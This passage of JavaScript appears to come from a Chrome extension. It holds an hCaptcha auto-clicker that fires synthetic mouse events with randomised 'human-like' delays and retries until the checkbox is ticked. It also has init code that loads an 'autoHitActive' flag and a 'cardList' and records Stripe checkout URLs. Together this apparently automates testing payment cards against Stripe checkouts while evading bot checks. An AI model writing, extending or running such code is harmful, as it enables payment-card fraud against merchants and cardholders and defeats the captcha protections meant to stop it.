            // We can't directly check iframe content, but we can check if the iframe still exists or has changed
            if (iframe.parentNode) {
              console.log('[HCaptcha] Iframe still present, may need manual completion');
            }
          }, 2000);

        } catch (e) {
          console.error('[HCaptcha] Error activating iframe:', e);
        }
      }, delay);

    } catch (e) {
      console.error('[HCaptcha] Error in activateHCaptchaIframe:', e);
    }
  }

  function clickHCaptchaCheckbox(element) {
    try {
      console.log('[HCaptcha] Attempting to click checkbox...');

      // Add random delay to seem more human-like
      const delay = Math.random() * 1000 + 500; // 500-1500ms
      setTimeout(() => {
        try {
          // Create mouse events to simulate real click
          const events = ['mousedown', 'mouseup', 'click'];

          for (const eventType of events) {
            const event = new MouseEvent(eventType, {
              view: window,
              bubbles: true,
              cancelable: true,
              clientX: element.getBoundingClientRect().left + element.offsetWidth / 2,
              clientY: element.getBoundingClientRect().top + element.offsetHeight / 2,
              button: 0,
              buttons: 1
            });
            element.dispatchEvent(event);
          }

          // Also try direct click as fallback
          element.click();

          console.log('[HCaptcha] Click events dispatched');

          // Check if it worked after a short delay
          setTimeout(() => {
            const isChecked = element.getAttribute('aria-checked') === 'true';
            console.log('[HCaptcha] Checkbox checked status:', isChecked);
            if (!isChecked) {
              console.log('[HCaptcha] Checkbox not checked, trying again...');
              // Try one more time with a longer delay
              setTimeout(() => clickHCaptchaCheckbox(element), 2000);
            } else {
              console.log('[HCaptcha] ✅ hCaptcha checkbox successfully clicked!');
            }
          }, 1000);

        } catch (e) {
          console.error('[HCaptcha] Error dispatching click events:', e);
        }
      }, delay);

    } catch (e) {
      console.error('[HCaptcha] Error in clickHCaptchaCheckbox:', e);
    }
  }

  async function init() {
    try {
      const r = await chrome.runtime.sendMessage({ type: 'GET_STATE' });
      if (r) {
        state.autoHitActive = r.autoHitActive ?? false;
        state.cardList = r.cardList ?? [];
      }
    } catch (_) {}

    // Setup hCaptcha auto-clicker
    setupHCaptchaAutoClicker();

    // Store the original checkout URL if we're on a checkout page
    if (typeof location !== 'undefined' && location.href) {
      const url = location.href;
      const urlLower = url.toLowerCase();

      // More specific checkout URL detection - avoid matching Stripe JS controllers
      if (urlLower.includes('checkout.stripe.com') ||
          (urlLower.includes('stripe.com') && /\/c\/pay\//.test(url)) ||
          (urlLower.includes('billing.stripe.com') && /\/p\/session\//.test(url))) {

        state.originalCheckoutUrl = url.split('#')[0]; // Store without fragment
        console.log('[init] Stored original checkout URL:', state.originalCheckoutUrl);
      } else {
        console.log('[init] Not a checkout page, URL:', url);
      }
    }
  }
  init();

  document.addEventListener('aries-state-update', (e) => {
    const d = e.detail || {};
    state.autoHitActive = d.autoHitActive ?? state.autoHitActive;
    state.cardList = d.cardList ?? state.cardList;
    if (d.resetAttempts) state.attemptCount = 0;
  });
})();
